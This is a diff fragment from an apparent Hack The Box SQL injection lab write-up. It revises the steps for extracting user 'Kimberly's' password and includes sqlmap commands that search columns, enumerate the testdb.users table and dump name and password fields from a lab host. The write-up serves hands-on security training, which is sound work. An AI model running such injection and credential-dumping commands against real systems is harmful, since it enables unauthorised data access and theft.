@@ -17,8 +17,9 @@ Initially running a broad `--schema` dump produced excessive noise, making it in
 sqlmap -u "[http://154.57.164.70:30903/case1.php?id=1](http://154.57.164.70:30903/case1.php?id=1)" --search -C style --batch
 ```
 #### Task 2: Extracting Target User Credentials (User: "Kimberly")
-To extract credentials efficiently without dumping heavy database overhead, I targeted the specific database and table structure. I first enumerated the column layout to confirm the exact parameter names before executing a targeted data dump.
+After identifying the layout structure, the next objective was to pull the password for the user "Kimberly". Because broad dumps produce too much noise, I used a structured, step-by-step approach to pinpoint the exact credentials.
 
-```bash
-sqlmap -u "[http://154.57.164.70:30903/case1.php?id=1](http://154.57.164.70:30903/case1.php?id=1)" -D testdb -T users --columns --batch
-sqlmap -u "[http://154.57.164.70:30903/case1.php?id=1](http://154.57.164.70:30903/case1.php?id=1)" -D testdb -T users --dump -C name,password --batch
+1. **Mapping the Table Structure:**
+   Knowing that HTB exercises frequently use a database named `testdb` and a table named `users`, I needed to discover the exact column names first. I ran a targeted command to list the columns inside that specific table:
+   ```bash
+   sqlmap -u "[http://154.57.164.70:30903/case1.php?id=1](http://154.57.164.70:30903/case1.php?id=1)" -D testdb -T users --columns --batch
